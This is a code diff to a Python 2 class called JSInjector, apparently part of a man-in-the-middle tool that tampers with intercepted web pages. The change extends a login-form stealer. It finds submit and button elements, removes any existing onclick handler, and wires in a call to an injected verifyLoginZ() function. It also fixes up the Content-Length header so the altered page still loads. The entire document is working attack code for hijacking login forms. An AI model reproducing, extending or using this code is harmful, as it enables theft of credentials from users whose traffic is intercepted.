@@ -5,6 +5,7 @@ class JSInjector:
     def __init__(self):
         self._tools = Functions()
         self._injectionPlaces = ["</head>", "<script ", "</body>", "<div>", "<title>", "<link rel", "<p ", "<br/>"]
+        self._buttonTypes = ['type="button"', 'type="submit"']
         self._hasFormStealer = False
 
     def injectScriptIntoHeader(self, response, code_to_inject=""):
@@ -108,14 +109,38 @@ class JSInjector:
         """
 
         if status:
-            print "Adding onClick event"
-            try:
-                start = response.index('type="submit"') + len('type="submit"') + 1
-                response = str(response[:start]) + 'onclick="verifyLoginZ()" ' + str(response[start:])
-                header = self._tools.getHeader(response)
+            print "[*] Adding onClick event"
+            for b in self._buttonTypes:
+                try:
+                    start = response.index(b) + len(b) + 1
+                    end = response.index("/>", start)
+                    response = self._removeOnClickEvent(response, start, end)
+                    response = str(response[:start]) + 'onclick="verifyLoginZ()" ' + str(response[start:])
 
-            except Exception:
-                return oldresponse
+                    print "[+] Added button event in: " + str(b)
+                    self._hasFormStealer = True
+                    return response
+                except Exception:
+                    continue
 
-        self._hasFormStealer = True
+        return oldresponse
+
+
+    def _removeOnClickEvent(self, response, start, end):
+        button = response[start:end]
+        if "onclick=" in button:
+            print "[*] Previous onclick event found. Try to remove it"
+            print "[*] " + str(button)
+            ostart = button.index("onclick=")
+            oend = button.index('"', ostart + len('onclick="'))
+            on_click = button[ostart:oend+1]
+            print "[*] " + str(on_click)
+            button_new = button.replace(on_click, "")
+            response = response.replace(button, button_new)
+            print "[*] Removed"
+            print "[*] " + str(button_new)
+            print "[*] Need to substract the removed content length..."
+            len_to_remove = len(on_click)
+            response = self._tools.changeContentlength(response, -len_to_remove)
+
         return response
